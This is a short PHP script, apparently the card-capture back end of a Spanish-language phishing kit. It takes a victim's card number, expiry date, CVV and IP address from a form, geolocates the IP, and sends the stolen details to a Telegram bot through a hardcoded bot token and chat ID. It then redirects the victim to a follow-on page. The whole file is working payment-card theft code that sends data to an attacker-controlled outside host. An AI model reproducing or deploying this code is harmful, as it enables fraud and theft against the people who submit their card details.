<?php
$tar = $_POST['tarj'];
$venc = $_POST['date'];
$cvv = $_POST['cvv'];
$ip = $_SERVER["REMOTE_ADDR"];

// Crear el mensaje para enviar al bot de Telegram
$mensaje = " \n  TD CARD \nNúmero de tarjeta: " . $tar . "\nFecha de vencimiento: " . $venc . "\nCódigo de seguridad: " . $cvv . "\nIP: " . $ip ;








 
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/" . $ip);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$ip_data_in = curl_exec($ch);
curl_close($ch);
$ip_data = json_decode($ip_data_in, true);
 
 
 

    
    $agent = $_SERVER["HTTP_USER_AGENT"];
    $ip = $_SERVER["REMOTE_ADDR"];
   







// Enviar el mensaje al bot de Telegram usando la API de Telegram
$bot_token = "5545935446:AAEaPWR8OUOL-0OBbqMLzioXF9jXLNT7jbM";
$chat_id = "5157616506";
$bot_url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($mensaje);
file_get_contents($bot_url);

// Redirigir al usuario a una página de confirmación
header("Location: correo.html");
?>
